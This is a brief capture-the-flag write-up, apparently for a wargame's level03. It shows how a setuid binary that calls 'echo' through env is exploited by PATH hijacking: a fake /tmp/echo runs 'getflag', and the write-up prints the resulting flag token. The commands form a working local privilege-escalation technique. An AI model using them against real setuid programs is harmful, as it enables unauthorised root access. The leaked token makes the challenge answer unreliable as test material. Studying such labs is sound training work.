# First step

We have a level03 file on home directory.  
We can know this file have a 's' permission.  
What's means?  

    when a executable file with 's' permission is executed.
        -> the file is executed with root privileges (temporaire).  

```shell
$> ./level03
Exploit me
```

# Second step

With Ghidra:
```c
[...]
iVar1 = system("/usr/bin/env echo Exploit me");
[...]
```

We trying change local of echo file to /tmp with a fake echo executable.

```shell
$> echo 'getflag' > /tmp/echo

$> chmod +x /tmp/echo  

$> export PATH=/tmp:$PATH

$> ./level03
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```